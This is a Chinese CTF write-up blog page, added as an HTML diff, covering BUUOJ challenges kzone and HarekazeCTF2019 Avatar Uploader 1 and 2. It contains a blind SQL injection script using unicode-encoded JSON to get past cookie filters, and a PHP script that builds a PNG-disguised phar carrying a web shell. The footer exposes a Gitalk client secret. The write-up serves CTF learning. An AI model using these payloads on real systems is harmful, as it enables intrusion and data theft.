@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    BUUOJ刷题_1 |
+    
+    Mount4in</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Mount4in" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-buuoj-1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      BUUOJ刷题_1
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/02/07/buuoj-1/" class="article-date">
+  <time datetime="2020-02-07T06:25:26.000Z" itemprop="datePublished">2020-02-07</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        
+        <p>记录buuoj刷题</p>
+<a id="more"></a>
+
+<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><h4 id="考点：代码审计、sql注入、json编码绕过"><a href="#考点：代码审计、sql注入、json编码绕过" class="headerlink" title="考点：代码审计、sql注入、json编码绕过"></a>考点：代码审计、sql注入、json编码绕过</h4><p>访问链接会跳转到qq空间登录页面，用dirsearch可以爆破到<code>www.zip</code>文件泄露，下载代码进行审计，审计代码大致流程，可以发现included/member.php中存在一处弱类型比较</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143054839-1581129209172.png" alt="image-20200207143054839"></p>
+<p>如果想要利用，直接访问/include/member.php是不可以的，必须是从/include/common.php中包含进来，因为要满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在/admin/index.php</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143458244.png" alt="image-20200207143458244"></p>
+<p>所以可以访问admin/index.php，利用弱类型比较绕过，</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207143759508.png" alt="image-20200207143759508"></p>
+<p>分析程序逻辑还可以用另一个方法绕过，输入一个不存在的admin_user，那么查询出来的密码就为空，同时LOGINKEY可以在源码中找到，</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207144337743.png" alt="image-20200207144337743"></p>
+<p>之后找注入点，源码对GET、POST、COOKIE、XFF都进行了过滤，不能注入。但在member.php</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200207144631042.png" alt="image-20200207144631042"></p>
+<p>对cookie先进行过滤再json解码，所以可以通过编码绕过过滤。尝试使用sqlmap编写tamper但是没有成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = payload.replace(<span class="string">'u'</span>, <span class="string">'u0075'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'o'</span>, <span class="string">'u006f'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'i'</span>, <span class="string">'u0069'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">"'"</span>, <span class="string">'u0027'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'"'</span>, <span class="string">'u0022'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'u0020'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'s'</span>, <span class="string">'u0073'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'#'</span>, <span class="string">'u0023'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'u003e'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'u003c'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'-'</span>, <span class="string">'u002d'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'='</span>, <span class="string">'u003d'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>编写脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;fab3873f-f34d-4468-b1d1-df9c59fd565a.node3.buuoj.cn&#x2F;admin&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  		&quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">		&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	high &#x3D; 127</span><br><span class="line">	low &#x3D; 32</span><br><span class="line">	mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">	while high &gt; low:</span><br><span class="line">		#payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020group_concat(column_NAME)\\u0020from\\u0020inf\\u006frmation_schema.columnS\\u0020where\\u0020table_name\\u003d\\u0022fl2222g\\u0022),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		payload&#x3D;&quot;(asci\\u0069(m\\u0069d((\\u0073elect\\u0020f44ag\\u0020from\\u0020fl2222g),&#123;&#125;,1))\\u003e&#123;&#125;)&quot;</span><br><span class="line">		data&#x3D;&#39;&#123;&quot;admin_user&quot;:&quot;1\\u0027\\u0020\\u006fr\\u0020&#39;+payload.format(i,mid)+&#39;\\u0023&quot;,&quot;admin_pass&quot;:48&#125;&#39;</span><br><span class="line">		cookie&#x3D;&#123;&quot;islogin&quot;:&#39;1&#39;, &quot;login_data&quot;:data&#125;</span><br><span class="line">		print(cookie)</span><br><span class="line">		r&#x3D;requests.post(url,cookies&#x3D;cookie)#,proxies&#x3D;proxies)</span><br><span class="line">		#print(r.content)</span><br><span class="line">		if b&quot;window.location&quot; not in r.content:</span><br><span class="line">			low&#x3D;mid+1 </span><br><span class="line">		else:</span><br><span class="line">			high&#x3D;mid</span><br><span class="line">		mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">	flag+&#x3D;chr(mid)</span><br><span class="line">	print(flag)</span><br><span class="line">#fish_admin,fish_ip,fish_user,fl2222g </span><br><span class="line">#f44ag</span><br></pre></td></tr></table></figure>
+
+<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><h4 id="考点：代码审计、文件上传类型判断缺陷"><a href="#考点：代码审计、文件上传类型判断缺陷" class="headerlink" title="考点：代码审计、文件上传类型判断缺陷"></a>考点：代码审计、文件上传类型判断缺陷</h4><p>题目给了源码，是一个文件上传类型题，可以在upload.php中看到</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208085525331.png" alt="image-20200208085525331"></p>
+<p>源码中先对文件大小进行判断，然后对文件类型进行了两次判断，第一次是用<code>finfo_file()</code>，限制文件类型必须为<code>image/png</code>。然后又用<code>getimagesize()</code>判断，如果文件类型不为IMAGETYPE_PNG，得到flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">var_dump(finfo_file($file, <span class="string">"hazectf.png"</span>));<span class="comment">//string(9) "image/png"</span></span><br><span class="line">finfo_close($file);</span><br><span class="line">$f = getimagesize(<span class="string">"hazectf.png"</span>);</span><br><span class="line">var_dump(getimagesize(<span class="string">"hazectf.png"</span>));<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/07/buuoj-1/image-20200208093107918.png" alt="image-20200208093107918"></p>
+<p>对上面的图片</p>
+<ul>
+<li>finfo_file：判断类型为imge/png</li>
+</ul>
+<ul>
+<li>getimagesize：不能判断</li>
+</ul>
+<p>所以可以绕过判断得到flag</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208093301821.png" alt="image-20200208093301821"></p>
+<h2 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h2><h4 id="考点：代码审计、文件包含"><a href="#考点：代码审计、文件包含" class="headerlink" title="考点：代码审计、文件包含"></a>考点：代码审计、文件包含</h4><p>源码和上一题的源码一样，第一个flag在文件上传出，第二个flag考点在文件包含。审计源码，在index.php中存在<code>include()</code>。</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208093734088.png" alt="image-20200208093734088"></p>
+<p>尽管<code>include()</code>限制了后缀，但我们可以利用<code>phar</code>来解决。接下来理清代码执行流程，重点是源码对session的操作。题目给了提示：<code>password_hash()</code>函数。</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208094051650.png" alt="image-20200208094051650"></p>
+<p>这个函数在password参数超过72后，即使72位后面的字符不相同，也返回相同的散列后的密码。接下来看一下源码的session处理机制。</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208094857822.png" alt="image-20200208094857822"></p>
+<p>在index.php中会new一个session，然后执行<code>SecureClientSession</code>类的析构函数，将session认证后，解码后赋值给<code>$data</code>。我们需要伪造session值，使它能够经过认证而且能够在<code>$data</code>中增加<code>theme</code>变量。然后发现</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208100257577.png" alt="image-20200208100257577"></p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208100344663.png" alt="image-20200208100344663"></p>
+<p>所以在上传文件后未经过重定向的session的值为</p>
+<p>eyJuYW1lIjoidHR0dHQiLCJhdmF0YXIiOiIyN2E5NDU4Yi5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3N</p>
+<p>hZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJEM0c3F4W</p>
+<p>WQ0QlNFaUExZkZCb0t3NGU4eGlXL0NYdk8yZnJUT1UzWUZXd2lRZktwdlJnaU8y</p>
+<p><code>$data</code>json编码后为<code>{&quot;name&quot;:&quot;ttttt&quot;,&quot;avatar&quot;:&quot;27a9458b.png&quot;,&quot;flash{&quot;type&quot;:&quot;info&quot;,&quot;message&quot;:&quot;Your avatar has been successfully updated!&quot;}}</code></p>
+<p>长度明显超过72，然后在session中添加<code>theme</code>达到效果。</p>
+<h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><ol>
+<li><p>生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>上传文件修改session</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208101116758.png" alt="image-20200208101116758"></p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208101508941.png" alt="image-20200208101508941"></p>
+</li>
+<li><p>执行命令</p>
+<p><img src="/2020/02/07/buuoj-1/image-20200208101915660.png" alt="image-20200208101915660"></p>
+</li>
+</ol>
+<p><strong>ref</strong>:<a href="https://nikoeurus.github.io/2019/11/07/HarekazeCTF2019-Web/" target="_blank" rel="noopener">2019 HarekazeCTF-Web部分复现WriteUp</a></p>
+
+      
+    </div>
+  </div>
+  <!-- 要添加的内容 -->
+  
+    <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>Mount4in</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2020/02/07/buuoj-1/" target="_blank" title="BUUOJ刷题_1">http://mount4in.github.io/2020/02/07/buuoj-1/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
+
+  
+  <!---->
+    <footer class="article-footer">
+      <a data-url="http://mount4in.github.io/2020/02/07/buuoj-1/" data-id="clg20p5l6000g14uv1nllatcu"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="tag">刷题记录</a></li></ul>
+
+    </footer>
+
+
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            2020新春战役网络安全公益赛web部分题解
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/05/04/%E9%85%8D%E7%BD%AE/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">配置</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2023 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
